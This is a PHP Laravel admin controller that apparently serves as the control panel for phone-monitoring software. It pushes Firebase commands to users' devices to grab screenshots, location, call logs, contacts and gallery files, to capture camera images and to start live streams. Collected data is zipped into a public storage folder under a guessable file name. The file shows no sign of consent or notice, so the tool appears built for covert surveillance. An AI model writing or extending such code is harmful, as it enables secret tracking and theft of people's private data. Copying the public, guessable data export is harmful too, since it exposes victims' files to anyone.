<?php

namespace App\Http\Controllers\Admin;

use App\Http\Controllers\Controller;
use App\Models\User;
use Illuminate\Http\Request;

class UserController extends Controller
{
    public function index()
    {
        $users = User::latest()->paginate(10);
        return view('admin.users.index', compact('users'));
    }

    public function show(User $user)
    {
        // Load relationships needed for the view
        $user->load(['device_logs' => function($query) {
            $query->latest()->take(50);
        }, 'media', 'backups']);
        
        return view('admin.users.show', compact('user'));
    }

    public function command(Request $request, User $user, $type)
    {
        $data = $request->all();
        $payload = null;
        $fcmAction = $type;

        // Map types to FCM actions and validate payload
        switch ($type) {
            case 'screenshot':
            case 'request_location':
            case 'backup_call_log':
            case 'backup_contacts':
                // No extra payload needed
                break;
            case 'capture_image':
                $payload = ['camera_facing' => $data['camera_facing'] ?? 'back'];
                break;
            case 'backup_gallery':
                $payload = ['media_type' => $data['media_type'] ?? 'all'];
                break;
            case 'start_stream':
                // special handling below
                break;
            default:
                return response()->json(['error' => 'Invalid command'], 400);
        }

        // Create Command Log
        $log = \App\Models\CommandLog::create([
            'user_id' => $user->id,
            'admin_id' => auth()->id(),
            'command' => $type,
            'status' => 'pending',
            'payload' => $payload,
        ]);

        if (!$user->fcm_token) {
            return response()->json(['error' => 'User has no FCM Token'], 400);
        }

        try {
            // Setup Google Auth
            $credentialsPath = storage_path('app/firebase_credentials.json');
            if (!file_exists($credentialsPath)) return response()->json(['error' => 'Firebase credentials missing'], 500);
            
            $credentials = new \Google\Auth\Credentials\ServiceAccountCredentials(
                'https://www.googleapis.com/auth/firebase.messaging',
                $credentialsPath
            );
            $token = $credentials->fetchAuthToken();
            $jsonKey = json_decode(file_get_contents($credentialsPath), true);
            $projectId = $jsonKey['project_id'];

            // Prepare Data
            $fcmData = [
                'action' => $fcmAction,
                'command_id' => (string) $log->id,
            ];
            
            if ($payload) {
                $fcmData = array_merge($fcmData, $payload);
            }

            // Special Case: Start Stream
            if ($type === 'start_stream') {
                $stream = \App\Models\LiveStream::create([
                    'user_id' => $user->id,
                    'status' => 'active',
                    'started_at' => now(),
                ]);
                $fcmData['live_stream_id'] = (string) $stream->id;
                
                // Send FCM
                $this->sendFcm($projectId, $token['access_token'], $user->fcm_token, $fcmData);
                
                return response()->json([
                    'success' => true, 
                    'message' => 'Stream started',
                    'stream_url' => route('admin.streams.show', $stream->id) 
                ]);
            }

            // Standard Send
            $this->sendFcm($projectId, $token['access_token'], $user->fcm_token, $fcmData);

            return response()->json(['success' => true, 'message' => 'Command sent successfully']);

        } catch (\Exception $e) {
            return response()->json(['error' => $e->getMessage()], 500);
        }
    }

    public function downloadZip(User $user)
    {
        // Maximum simplicity - only built-in PHP, no external libraries
        set_time_limit(0);
        ini_set('memory_limit', '2048M');
        
        $user->load(['media', 'backups']);

        $zipName = "backup_" . $user->id . "_" . time() . ".zip";
        $tempDir = storage_path('app/public/temp');
        
        if (!file_exists($tempDir)) {
            mkdir($tempDir, 0755, true);
        }
        
        $zipPath = $tempDir . '/' . $zipName;

        $zip = new \ZipArchive();
        if ($zip->open($zipPath, \ZipArchive::CREATE | \ZipArchive::OVERWRITE) !== TRUE) {
            return back()->with('error', 'Cannot create ZIP file');
        }

        // Add all media files
        foreach ($user->media as $media) {
            if (!$media->file_path) continue;
            
            $filePath = storage_path('app/public/' . $media->file_path);
            
            if (file_exists($filePath) && is_file($filePath)) {
                $folder = ucfirst($media->category ?? 'Media');
                $fileName = $media->id . '_' . basename($filePath);
                $zip->addFile($filePath, "Images/{$folder}/{$fileName}");
            }
        }

        // Add all backup data
        foreach ($user->backups as $backup) {
            $type = ucfirst($backup->type ?? 'Other');
            
            if (!empty($backup->file_path)) {
                $filePath = storage_path('app/public/' . $backup->file_path);
                if (file_exists($filePath) && is_file($filePath)) {
                    $zip->addFile($filePath, "Backups/{$type}/" . basename($filePath));
                }
            } elseif (!empty($backup->data)) {
                $zip->addFromString("Backups/{$type}/data_" . time() . ".json", $backup->data);
            }
        }

        $zip->close();

        // Return download URL
        return response()->json([
            'success' => true,
            'url' => asset('storage/temp/' . $zipName)
        ]);
    }


    private function sendFcm($projectId, $accessToken, $deviceToken, $data)
    {
        $client = new \GuzzleHttp\Client();
        $client->post("https://fcm.googleapis.com/v1/projects/{$projectId}/messages:send", [
            'headers' => [
                'Authorization' => 'Bearer ' . $accessToken,
                'Content-Type' => 'application/json',
            ],
            'json' => [
                'message' => [
                    'token' => $deviceToken,
                    'data' => $data,
                ],
            ],
        ]);
    }
}
